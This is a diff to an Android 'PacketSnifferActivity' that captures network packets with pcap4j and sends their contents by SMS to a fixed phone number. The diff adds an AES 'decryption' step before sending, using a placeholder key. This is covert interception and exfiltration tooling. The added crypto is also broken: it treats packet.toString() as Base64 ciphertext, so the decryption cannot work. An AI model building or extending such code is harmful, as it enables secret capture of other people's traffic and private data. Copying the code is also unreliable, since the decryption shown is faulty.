@@ -16,7 +16,12 @@ import org.pcap4j.core.PcapNetworkInterface;
 import org.pcap4j.packet.Packet;
 import org.pcap4j.util.NifSelector;
 
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
 import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
 import java.util.List;
 
 public class PacketSnifferActivity extends AppCompatActivity {
@@ -87,8 +92,11 @@ public class PacketSnifferActivity extends AppCompatActivity {
                     }
                 });
 
-                // Send SMS message with the packet data
-                sendSMS(packet.toString());
+                // Decrypt packet data
+                String decryptedData = decryptPacket(packet);
+
+                // Send SMS message with the decrypted packet data
+                sendSMS(decryptedData);
             }
         };
 
@@ -136,10 +144,38 @@ public class PacketSnifferActivity extends AppCompatActivity {
         // Save packets to a file if needed
     }
 
+    private String decryptPacket(Packet packet) {
+        // Decrypt packet data using a decryption algorithm
+        // Replace this with your actual decryption logic
+
+        // Example: AES decryption
+        String encryptedData = packet.toString(); // Assume packet data is stored in the packet.toString() format
+        String decryptedData = "";
+
+        try {
+            // Generate a secret key from a known key string
+            String keyString = "YOUR_ENCRYPTION_KEY";
+            SecretKey secretKey = new SecretKeySpec(keyString.getBytes(StandardCharsets.UTF_8), "AES");
+
+            // Initialize the cipher with the secret key and decryption mode
+            Cipher cipher = Cipher.getInstance("AES");
+            cipher.init(Cipher.DECRYPT_MODE, secretKey);
+
+            // Decrypt the encrypted data
+            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(encryptedData));
+            decryptedData = new String(decryptedBytes, StandardCharsets.UTF_8);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to decrypt packet: " + e.getMessage());
+        }
+
+        return decryptedData;
+    }
+
     private void sendSMS(String message) {
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendTextMessage(TO_PHONE_NUMBER, null, message, null, null);
         Log.d(TAG, "SMS sent to: " + TO_PHONE_NUMBER);
     }
 }
+
 
